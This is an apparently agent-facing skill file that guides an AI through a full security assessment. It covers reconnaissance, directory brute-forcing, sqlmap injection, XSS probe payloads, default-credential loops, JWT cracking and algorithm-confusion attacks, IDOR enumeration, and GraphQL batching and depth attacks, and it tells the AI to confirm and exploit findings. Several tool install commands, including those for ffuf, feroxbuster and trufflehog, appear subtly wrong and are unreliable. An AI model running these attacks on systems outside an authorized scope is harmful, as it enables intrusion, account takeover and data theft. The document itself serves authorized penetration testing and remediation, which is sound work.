---
name: ai-security-testing
description: >
  AI-agnostic security testing skill. Guides any AI agent (Claude, GPT, Gemini,
  Ollama local models, or any LLM) through a full security assessment using only standard
  open-source CLI tools — nmap, nuclei, semgrep, sqlmap, ffuf, gitleaks, trivy, and more.
  Runs entirely locally with no cloud account, no proprietary platform, and no mandatory paid
  service. Covers white-box code review (SAST, secrets, dependencies), black-box web app
  pentesting, REST/GraphQL API security, and OWASP Top 10:2025 assessment. Use when the user
  wants to security-scan, pentest, audit, or review code or a web app.
license: Apache-2.0
metadata:
  author: community
  homepage: https://owasp.org
---

# AI Security Testing

> **Fully local. Any AI. Any LLM.**
> Open-source tools only — nmap · nuclei · semgrep · sqlmap · ffuf · gitleaks · trivy · and more.

This skill turns any AI agent into a security tester. The AI reads tool output, reasons about
findings, chains follow-up commands, and writes a final report. No proprietary platform needed.

---

## Quick-start decision tree

```
What are you testing?
├─ Source code / repository  → Phase 4  (SAST, secrets, dependencies)
├─ Live web app / URL        → Phase 1 → 2 → 3 → 5  (recon → scan → manual checks)
├─ REST / GraphQL API        → Phase 1 → 6           (recon → API-specific)
├─ Everything (full pentest) → All phases in order
└─ Just fix known findings   → Phase 7  (fix guidance)
```

**Before anything else — confirm authorization:**
- Only test targets you own or are explicitly authorized to test.
- Prefer staging over production. These tools send real traffic and can modify data.
- Document authorization (email, bug bounty scope, etc.) before running.

---

## Prerequisites — Install everything once

### Linux / macOS

```bash
# --- Package managers ---
# Debian/Ubuntu
sudo apt update && sudo apt install -y nmap curl git python3-pip golang

# macOS (Homebrew)
brew install nmap curl git python3 go

# --- Go-based tools (works on both) ---
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/ffuf/v2@latest
go install -v github.com/ferroxidizer/feroxbuster@latest     # alt: cargo install feroxbuster
go install -v github.com/zricethezav/gitleaks/v8@latest

# --- Python-based tools ---
pip3 install --upgrade sqlmap semgrep trufflehog bandit pip-audit sslyze

# --- Other ---
# Nikto (Perl)
sudo apt install -y nikto   # or: git clone https://github.com/sullo/nikto

# Trivy (SCA + container)
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin

# testssl.sh (TLS)
git clone --depth 1 https://github.com/drwetter/testssl.sh.git
chmod +x testssl.sh/testssl.sh

# jwt_tool
git clone https://github.com/ticarpi/jwt_tool && pip3 install termcolor cprint pycryptodomex requests

# wafw00f (WAF detection)
pip3 install wafw00f
```

### Windows (PowerShell / WSL)

> **Recommended:** Use WSL2 (Ubuntu) and run all commands above inside it. Most tools
> do not have native Windows binaries. The steps below are for PowerShell where available.

```powershell
# Install WSL2 with Ubuntu (one-time, needs reboot)
wsl --install

# Inside WSL, follow the Linux steps above.

# Native Windows alternatives (if WSL not available):
# Nmap: https://nmap.org/download.html  (installer)
# Nuclei: https://github.com/projectdiscovery/nuclei/releases  (download nuclei.exe)
# Trivy: https://github.com/aquasecurity/trivy/releases        (download trivy.exe)
# Semgrep: pip install semgrep  (works natively with Python on Windows)
# Gitleaks: https://github.com/gitleaks/gitleaks/releases      (download gitleaks.exe)
```

### Verify installs

```bash
nmap --version
nuclei -version
httpx -version
ffuf -V
semgrep --version
sqlmap --version
gitleaks version
trivy version
```

---

## Phase 1 — Reconnaissance

Goal: understand the attack surface before sending a single exploit payload.

### 1a. Port and service discovery

```bash
TARGET="192.168.1.100"   # or a domain
TARGET_URL="https://staging.example.com"

# Fast top-1000 port scan
nmap -sV -sC -T4 -oN recon/nmap_fast.txt "$TARGET"

# Full port scan (slower, but catches non-standard ports)
nmap -sV -sC -p- -T4 -oN recon/nmap_full.txt "$TARGET"

# UDP top-100 (DNS, SNMP, NTP — often overlooked)
sudo nmap -sU --top-ports 100 -oN recon/nmap_udp.txt "$TARGET"
```

**AI: Read `recon/nmap_full.txt`. Note every open port, service version, and the OS guess.
Flag anything unexpected (admin panels on high ports, databases exposed to the network,
outdated service versions). List them as recon findings before proceeding.**

### 1b. HTTP probing and WAF detection

```bash
# Probe the web surface and follow redirects
echo "$TARGET_URL" | httpx -title -status-code -tech-detect -follow-redirects \
  -o recon/httpx.txt

# Detect WAF (know what you are up against before fuzzing)
wafw00f "$TARGET_URL"
```

**AI: Note the technologies detected by httpx (framework, server, CMS). A WAF means fuzzing
will be throttled — reduce ffuf rate (`-rate 10`) and use `-mc all` to see blocked responses.**

### 1c. SSL/TLS assessment

```bash
# testssl.sh — comprehensive cipher/cert/protocol check
./testssl.sh/testssl.sh --quiet --color 0 --logfile recon/testssl.txt "$TARGET_URL"

# Or sslyze (Python, JSON output)
sslyze "$TARGET" --json_out recon/sslyze.json
```

**AI: Check for: expired/self-signed cert, weak ciphers (RC4, DES, 3DES), SSLv2/SSLv3/TLS 1.0
enabled, missing HSTS, certificate transparency. Each is a finding.**

---

## Phase 2 — Surface Mapping (Directory & Endpoint Discovery)

Goal: find hidden paths, admin panels, backup files, API endpoints, and sensitive resources.

```bash
# Fast directory bruteforce — use a quality wordlist
ffuf -u "$TARGET_URL/FUZZ" \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 200,201,204,301,302,307,401,403 \
  -o recon/ffuf_dirs.json -of json \
  -t 40 -rate 50

# Common SecLists wordlist (better coverage)
# Download: https://github.com/danielmiessler/SecLists
ffuf -u "$TARGET_URL/FUZZ" \
  -w SecLists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc 200,201,204,301,302,307,401,403 \
  -o recon/ffuf_dirs_medium.json -of json \
  -t 40 -rate 50

# API endpoint discovery
ffuf -u "$TARGET_URL/api/FUZZ" \
  -w SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,400,401,403,405 \
  -o recon/ffuf_api.json -of json

# File extension bruteforce (backups, configs, source)
ffuf -u "$TARGET_URL/FUZZ" \
  -w SecLists/Discovery/Web-Content/raft-medium-files.txt \
  -e .bak,.old,.zip,.tar.gz,.sql,.config,.env,.git \
  -mc 200,201,301,302 \
  -o recon/ffuf_files.json -of json

# Feroxbuster (recursive, good for SPAs)
feroxbuster -u "$TARGET_URL" \
  -w /usr/share/wordlists/dirb/common.txt \
  -o recon/feroxbuster.txt \
  --rate-limit 50 --depth 3
```

**AI: Parse the JSON output files. Flag: admin/management paths (admin, dashboard, console,
manager), backup/source files (.bak, .sql, .env, .git), API versioning gaps (v1 present but
v2 also responding), and 401/403 paths (worth testing for auth bypass).**

---

## Phase 3 — Automated Vulnerability Scanning

Goal: run templated checks across the known surface before manual work.

### 3a. Nuclei — template-based scanner

```bash
# Update templates first
nuclei -update-templates

# Full scan against the target
nuclei -u "$TARGET_URL" \
  -severity critical,high,medium \
  -o results/nuclei.txt \
  -j -o results/nuclei.json

# OWASP Top 10 focused
nuclei -u "$TARGET_URL" \
  -tags owasp \
  -o results/nuclei_owasp.txt

# CVE checks (known CVEs in exposed software)
nuclei -u "$TARGET_URL" \
  -tags cve \
  -o results/nuclei_cve.txt

# Misconfigurations
nuclei -u "$TARGET_URL" \
  -tags misconfig \
  -o results/nuclei_misconfig.txt

# Tech-specific (fill in detected tech from Phase 1)
nuclei -u "$TARGET_URL" \
  -tags wordpress   # or: nginx, apache, jenkins, grafana, etc.
```

**AI: Read `results/nuclei.json`. Group findings by severity. For each critical/high:
verify whether the request shown actually returned the vulnerable response, or if nuclei
matched a false positive pattern. Note the template ID and CVE/CWE mapping.**

### 3b. Nikto — classic web scanner

```bash
nikto -h "$TARGET_URL" \
  -output results/nikto.txt \
  -Format txt \
  -Tuning 1234578   # covers XSS, injection, file inclusion, info disclosure, misconfig
```

**AI: Nikto is noisy. Focus on: dangerous HTTP methods (PUT/DELETE), default credentials found,
server version disclosure, dangerous files (/phpmyadmin, /admin, /server-status), and headers.**

### 3c. Security headers check

```bash
# Check all security headers in one request
curl -s -D - "$TARGET_URL" -o /dev/null | grep -iE \
  "content-security-policy|x-frame-options|x-content-type-options|strict-transport-security|referrer-policy|permissions-policy|access-control-allow-origin"

# CORS misconfiguration check
curl -s -H "Origin: https://evil.com" -I "$TARGET_URL" | grep -i "access-control"
curl -s -H "Origin: null" -I "$TARGET_URL" | grep -i "access-control"
```

**AI: Missing headers to flag as findings: CSP (XSS risk), X-Frame-Options or CSP frame-ancestors
(clickjacking), X-Content-Type-Options (MIME sniffing), HSTS (downgrade risk). CORS:
`Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` is a critical finding.**

---

## Phase 4 — White-box: SAST, Secrets, and Dependencies

Use when you have access to the source code or repository. Run from the repo root.

### 4a. Static analysis (SAST)

```bash
# --- Semgrep — language-agnostic, OWASP ruleset ---
# Auto-detects languages; covers Python, JS/TS, Go, Java, Ruby, PHP, C/C++
semgrep --config=auto --severity=WARNING --severity=ERROR \
  --json --output results/semgrep.json ./

# OWASP Top 10 specific rules
semgrep --config=p/owasp-top-ten \
  --json --output results/semgrep_owasp.json ./

# Injection-focused
semgrep --config=p/sql-injection \
  --config=p/command-injection \
  --json --output results/semgrep_injection.json ./

# --- Bandit (Python only) ---
bandit -r ./ -f json -o results/bandit.json --severity-level medium

# --- Gosec (Go only) ---
gosec -fmt json -out results/gosec.json ./...

# --- ESLint Security (JavaScript/TypeScript) ---
npm install -g eslint eslint-plugin-security
eslint --plugin security --rule '{"security/detect-object-injection": "warn"}' \
  --format json --output-file results/eslint_security.json "src/**/*.{js,ts}"
```

**AI: Parse results/semgrep.json. For each HIGH/CRITICAL finding:
1. Read the matched code at the reported file:line.
2. Trace the data flow — is the tainted input actually user-controlled?
3. Is there sanitization between the source and the sink?
4. If yes to user-controlled and no to sanitization: confirmed finding.
5. Write: file, line, vulnerability class, why it is exploitable, suggested fix.**

### 4b. Secret scanning

```bash
# Gitleaks — scans entire git history (commits, branches, stash)
gitleaks detect --source . \
  --report-format json \
  --report-path results/gitleaks.json \
  --verbose

# Also scan the current working tree (untracked files)
gitleaks detect --source . --no-git \
  --report-format json \
  --report-path results/gitleaks_worktree.json

# TruffleHog — entropy + pattern based, also scans history
trufflehog git file://. \
  --json > results/trufflehog.json

# Quick grep for common secret patterns (belt + suspenders)
grep -rn --include="*.env*" --include="*.config*" --include="*.yaml" --include="*.json" \
  -E "(api_key|apikey|secret|password|token|credential|private_key)\s*[=:]\s*['\"]?[A-Za-z0-9+/]{16,}" \
  . > results/secret_grep.txt
```

**AI: For every secret found:
1. Confirm it is a real value (not a placeholder like `your-api-key-here`).
2. Identify the service (AWS, GitHub, Stripe, DB password, etc.).
3. Check if the secret appears in git history (`git log -S "SECRET_VALUE" --all`).
4. If in history: the secret is compromised regardless of whether the file was later deleted.
Report as CRITICAL — severity is rotation-required, not just remove-from-code.**

### 4c. Dependency / SCA scanning

```bash
# Trivy — covers most ecosystems (npm, pip, go, cargo, composer, etc.)
# Scan a directory (detects lockfiles automatically)
trivy fs ./ \
  --format json \
  --output results/trivy.json \
  --severity CRITICAL,HIGH,MEDIUM

# Scan a Docker image
trivy image myapp:latest \
  --format json --output results/trivy_image.json

# --- Language-specific alternatives ---
# Python
pip-audit --format json --output results/pip_audit.json

# Node.js
npm audit --json > results/npm_audit.json
# or:
npx audit-ci --moderate

# Go
go list -m all | nancy sleuth   # install: go install github.com/sonatype-nexus-community/nancy@latest

# Ruby
bundle audit check --update --format json > results/bundler_audit.json
```

**AI: From trivy.json, extract CVEs where `Severity` is CRITICAL or HIGH.
For each: note the package name, installed version, fixed version, and CVE description.
Determine exploitability: is the vulnerable code path actually reachable in this application?
Recommend: update to fixed version. If no fix exists, note the workaround from the CVE advisory.**

---

## Phase 5 — Targeted Manual Checks

Automated scanners miss logic flaws and context-specific issues. These are systematic manual probes.

### 5a. SQL injection (sqlmap)

```bash
# Against a specific parameter
sqlmap -u "$TARGET_URL/search?q=test" \
  --dbs --batch --level 3 --risk 2 \
  --output-dir results/sqlmap/

# With session cookie (authenticated)
sqlmap -u "$TARGET_URL/user/profile?id=1" \
  --cookie "session=<your-session-cookie>" \
  --dbs --batch --level 3 --risk 2 \
  --output-dir results/sqlmap/

# POST request
sqlmap -u "$TARGET_URL/login" \
  --data "username=admin&password=test" \
  --dbs --batch --level 3 \
  --output-dir results/sqlmap/

# From a saved request file (copy from Burp/curl -v)
sqlmap -r request.txt --dbs --batch --output-dir results/sqlmap/
```

> **Do NOT use `--level 5 --risk 3` on production** — it sends destructive payloads.

**AI: sqlmap will tell you if a parameter is injectable and which technique worked
(boolean-blind, time-blind, UNION, etc.). If injectable: retrieve the database name,
then one table name as proof. Stop there — do not dump the full DB during testing.
Report: parameter name, injection type, database type/version, proof (the exact query that worked).**

### 5b. Cross-site scripting (XSS)

```bash
# Nuclei has XSS templates
nuclei -u "$TARGET_URL" -tags xss -o results/nuclei_xss.txt

# Manual reflection check — look for reflected input
curl -s "$TARGET_URL/search?q=<script>alert(1)</script>" | grep -i "script"
curl -s "$TARGET_URL/search?q='\"><img src=x onerror=alert(1)>" | grep -i "img"

# Test common injection points
for PARAM in q search name id user; do
  echo "Testing param: $PARAM"
  curl -s "$TARGET_URL?$PARAM=<svg/onload=alert(1)>" | grep -i "svg" && echo "  REFLECTED"
done
```

**AI: Reflection does not prove XSS — the input must reach the DOM unencoded.
Check whether the response contains the raw payload or an HTML-encoded version.
`&lt;script&gt;` = encoded = NOT vulnerable (for that context).
`<script>` verbatim = vulnerable. Note the parameter, the payload that worked,
and the response context (HTML body, attribute, JS variable, etc.).**

### 5c. Authentication and session testing

```bash
# Test for default credentials (common list)
for CRED in "admin:admin" "admin:password" "admin:123456" "root:root" "test:test"; do
  USER=$(echo $CRED | cut -d: -f1)
  PASS=$(echo $CRED | cut -d: -f2)
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "$TARGET_URL/login" \
    -d "username=$USER&password=$PASS")
  echo "$CRED -> HTTP $RESPONSE"
done

# Check for password reset token predictability
# Request two tokens close together; compare their entropy/structure
curl -s -X POST "$TARGET_URL/forgot-password" -d "email=test@example.com"

# Session fixation: does login rotate the session token?
# 1. Get a pre-login session token
PRE_SESSION=$(curl -s -c cookies_pre.txt "$TARGET_URL/login" -D - | grep "Set-Cookie" | head -1)
echo "Pre-login: $PRE_SESSION"
# 2. Login
curl -s -b cookies_pre.txt -c cookies_post.txt \
  -X POST "$TARGET_URL/login" -d "username=testuser&password=testpass"
POST_SESSION=$(grep "session" cookies_post.txt)
echo "Post-login: $POST_SESSION"
# If pre == post: session fixation vulnerability
```

**AI: Compare pre- and post-login session tokens. If the value is the same:
report session fixation. Also check: are session tokens in the URL? Is the token
in a cookie without HttpOnly? Without Secure? These are separate findings.**

### 5d. JWT testing

```bash
# Decode and inspect a JWT (no key needed)
python3 -c "
import base64, json, sys
token = 'YOUR.JWT.TOKEN'
parts = token.split('.')
for i, part in enumerate(['Header', 'Payload']):
    padded = parts[i] + '=' * (4 - len(parts[i]) % 4)
    print(f'{part}:', json.dumps(json.loads(base64.urlsafe_b64decode(padded)), indent=2))
"

# jwt_tool — full attack suite
python3 jwt_tool/jwt_tool.py YOUR.JWT.TOKEN -t "$TARGET_URL/api/user" \
  -rh "Authorization: Bearer YOUR.JWT.TOKEN" \
  -M pb   # pb = playbook mode (runs all attacks)

# Specific attacks
# Algorithm confusion (alg: none)
python3 jwt_tool/jwt_tool.py YOUR.JWT.TOKEN -X a

# Algorithm confusion (RS256 -> HS256 with public key)
python3 jwt_tool/jwt_tool.py YOUR.JWT.TOKEN -X s -pk public.pem

# Brute force weak secret
python3 jwt_tool/jwt_tool.py YOUR.JWT.TOKEN -C -d /usr/share/wordlists/rockyou.txt
```

**AI: For each attack mode in jwt_tool playbook, check the HTTP response code.
A 200 where a 401 was expected = successful bypass. Attacks to specifically check:
`alg: none` bypass, algorithm confusion, key confusion (RS256→HS256), and
brute-forced secret. The `kid` (key ID) injection is also worth testing manually.**

### 5e. IDOR / Broken access control

```bash
# Get your user's resource, then increment/decrement the ID
# Replace session cookie and object ID with real values
MY_SESSION="your_session_token"
MY_ID=100

for ID in $(seq $((MY_ID - 3)) $((MY_ID + 3))); do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Cookie: session=$MY_SESSION" \
    "$TARGET_URL/api/user/$ID")
  echo "ID $ID -> HTTP $RESPONSE"
done

# Try UUID-based IDORs (replace with a real UUID you own)
MY_UUID="550e8400-e29b-41d4-a716-446655440000"
curl -s -H "Cookie: session=$MY_SESSION" \
  "$TARGET_URL/api/orders/$MY_UUID" | python3 -m json.tool

# Try accessing admin endpoints as a regular user
for ENDPOINT in /admin /api/admin /api/v1/admin /dashboard/admin /management; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Cookie: session=$MY_SESSION" "$TARGET_URL$ENDPOINT")
  echo "$ENDPOINT -> $CODE"
done

# HTTP method override (some frameworks respect X-HTTP-Method-Override)
curl -s -X POST -H "X-HTTP-Method-Override: DELETE" \
  -H "Cookie: session=$MY_SESSION" \
  "$TARGET_URL/api/resource/1"
```

**AI: For ID enumeration: a 200 response for an ID that is not yours is a confirmed IDOR.
A 403 or 404 is the correct behavior. For admin endpoints: a 200 or 302 (redirect to
the actual page, not to login) accessed with a non-admin session is a confirmed privilege
escalation. Report the exact request and response that proved it.**

---

## Phase 6 — API-specific Security

### 6a. Schema-driven endpoint enumeration

```bash
# If an OpenAPI spec exists, extract all endpoints
python3 - <<'EOF'
import json, sys
with open("openapi.json") as f:
    spec = json.load(f)
base = spec.get("servers", [{}])[0].get("url", "")
for path, methods in spec.get("paths", {}).items():
    for method in methods:
        print(f"{method.upper()} {base}{path}")
EOF

# Feed the extracted paths into ffuf
python3 extract_paths.py | while read METHOD PATH; do
  curl -s -o /dev/null -w "$METHOD $PATH -> %{http_code}\n" \
    -X "$METHOD" -H "Authorization: Bearer YOUR_TOKEN" "$PATH"
done
```

### 6b. BOLA / IDOR at the API level

```bash
TOKEN_A="tenant_a_token"
TOKEN_B="tenant_b_token"
OBJECT_ID="object_owned_by_tenant_A"

# Try accessing tenant A's object with tenant B's token
curl -s -H "Authorization: Bearer $TOKEN_B" \
  "$TARGET_URL/api/v1/objects/$OBJECT_ID" | python3 -m json.tool

# The response body should be 403 or empty.
# If it contains tenant A's data: confirmed BOLA (API1:2023).
```

### 6c. Mass assignment check

```bash
# Attempt to set privileged fields in a user-update request
curl -s -X PATCH "$TARGET_URL/api/v1/users/me" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"name": "test", "role": "admin", "is_admin": true, "subscription": "enterprise"}'

# Then fetch your profile and check if the privileged fields changed
curl -s -H "Authorization: Bearer $TOKEN_A" \
  "$TARGET_URL/api/v1/users/me" | python3 -m json.tool
```

**AI: If `role`, `is_admin`, or `subscription` changed to the value you sent:
confirmed mass assignment (API3:2023). The fix is an allowlist of writable fields.**

### 6d. Rate limiting / resource consumption

```bash
# Test for rate limiting on auth endpoints
for i in $(seq 1 50); do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "$TARGET_URL/api/v1/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"wrong$i\"}")
  echo "Attempt $i: HTTP $CODE"
  sleep 0.1
done

# If all 50 return 200/400 (not 429): no rate limiting on login.
# Report as: Unrestricted Resource Consumption (API4:2023) + brute-force risk.
```

### 6e. GraphQL-specific

```bash
# Test if introspection is enabled (it should be disabled in production)
curl -s -X POST "$TARGET_URL/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}' | python3 -m json.tool

# Batching attack (can bypass rate limiting)
curl -s -X POST "$TARGET_URL/graphql" \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{ user(id: 1) { email } }"},
    {"query": "{ user(id: 2) { email } }"},
    {"query": "{ user(id: 3) { email } }"}
  ]' | python3 -m json.tool

# Depth attack (may cause DoS if no depth limit)
curl -s -X POST "$TARGET_URL/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user { friends { friends { friends { friends { name } } } } } }"}'
```

**AI: Introspection enabled in production = information disclosure finding (tells attackers
the full schema). Batching with no per-query rate limiting = rate-limit bypass.
Unlimited depth/complexity = potential DoS. Each is a separate finding.**

---

## Phase 7 — Fix Guidance

### Triage order

Work: **critical → high → medium → low**. Always re-test after fixing.

### Fix patterns by vulnerability class

| Class | Root-cause fix | Do NOT do |
|---|---|---|
| SQL injection | Parameterized queries / prepared statements at every sink | Block one string / add a WAF rule |
| XSS (reflected/stored) | Context-aware output encoding + CSP | Strip `<script>` tags only |
| XSS (DOM) | `textContent` instead of `innerHTML`; avoid `eval` | Sanitize only on the server |
| IDOR / BOLA | Object-level ownership check in every handler | Hide the endpoint / obfuscate IDs |
| Broken function-level authz | Server-side role check on every privileged route | Client-side role check |
| SSRF | Allowlist of permitted destinations + block RFC-1918 ranges | Blacklist approach |
| Mass assignment | Explicit allowlist of writable fields per role | Remove a single dangerous field |
| Secrets in code | Rotate secret immediately + move to env var / secret manager | Delete the file and force-push |
| Weak JWT | Use RS256/ES256 with proper key rotation; validate `alg` explicitly | Trust the `alg` claim from the token |
| Missing security headers | Set CSP, HSTS, X-Frame-Options, X-Content-Type-Options in every response | Set in some responses |
| Outdated dependency | Update to the patched version | Add a WAF rule for the CVE |
| Default credentials | Change all defaults during provisioning + scan for them in CI | Document them in the README |

### Verify the fix

```bash
# Re-run just the relevant nuclei template
nuclei -u "$TARGET_URL" -t nuclei-templates/path/to/specific-template.yaml

# Re-run sqlmap on the fixed parameter
sqlmap -u "$TARGET_URL/search?q=test" --batch --level 3 --risk 2

# Re-run semgrep on the fixed file
semgrep --config=auto results/path/to/fixed/file.py

# Re-run gitleaks to confirm secret is gone from history
gitleaks detect --source . --report-format json --report-path results/gitleaks_recheck.json

# Confirm header fix
curl -s -D - "$TARGET_URL" -o /dev/null | grep -iE "content-security-policy|x-frame-options"
```

---

## Reporting — Markdown Template

Save findings to `security_report.md`. Use this structure:

```markdown
# Security Assessment Report

**Target:** <URL or repo path>
**Date:** <YYYY-MM-DD>
**Tester:** <AI model + version>
**Scope:** <what was tested>
**Authorization:** <confirmation the user owns/is authorized to test the target>

---

## Executive Summary

<2–3 sentences: what was tested, how many findings, most critical issue>

## Findings

### [CRITICAL/HIGH/MEDIUM/LOW] Finding title

- **Severity:** CRITICAL / HIGH / MEDIUM / LOW / INFO
- **CWE:** CWE-XXX — <name>
- **OWASP:** <category if applicable>
- **Location:** <file:line or URL + parameter>
- **Tool that found it:** <nuclei / semgrep / manual / etc.>

**Description:**
<What is the vulnerability and why is it dangerous>

**Evidence (PoC):**
<!-- Paste the exact command and output that proves the issue -->
```bash
curl -s "https://target.com/search?q=' OR 1=1--" | grep "admin@"
```
Response showed: `admin@example.com` — SQL injection confirmed.

**Remediation:**
<Specific fix for this codebase, not generic advice>

**Verification:**
<Command to re-run to confirm the fix works>

---

## Coverage Statement

The following were tested: <list phases run>
The following were NOT tested: <list what was skipped and why>
A clean result from any automated tool covers only what it was pointed at.
Tools like nuclei and semgrep detect known patterns; novel business-logic flaws
require manual review beyond what this automated scan covers.

## Appendix: Raw tool output locations

| Tool | Output file |
|---|---|
| nmap | recon/nmap_full.txt |
| nuclei | results/nuclei.json |
| semgrep | results/semgrep.json |
| gitleaks | results/gitleaks.json |
| trivy | results/trivy.json |
```

---

## Honest Coverage Statement

This skill uses pattern-matching, signature-based, and semi-automated tools.
It finds what those tools are designed to find. It does **not** provide:

- **Autonomous exploitation** — tools flag candidates; the AI must manually confirm and exploit each one. This takes time and skill.
- **Business-logic flaw detection** — automated tools cannot understand your tenancy model, pricing rules, or workflow invariants. Manual review of critical flows is still required.
- **Zero-day discovery** — nuclei, semgrep, and sqlmap work from known patterns. Novel attack chains require creative human/AI reasoning beyond what templates encode.
- **Full OWASP A09 coverage** — logging and alerting cannot be tested from outside the system.

---

## Docs & References

| Resource | URL |
|---|---|
| Nuclei templates | https://github.com/projectdiscovery/nuclei-templates |
| SecLists wordlists | https://github.com/danielmiessler/SecLists |
| OWASP Testing Guide | https://owasp.org/www-project-web-security-testing-guide/ |
| OWASP Top 10:2025 | https://owasp.org/Top10/ |
| OWASP API Security Top 10 | https://owasp.org/API-Security/ |
| Semgrep rules | https://semgrep.dev/r |
| jwt_tool wiki | https://github.com/ticarpi/jwt_tool/wiki |
| testssl.sh | https://testssl.sh |

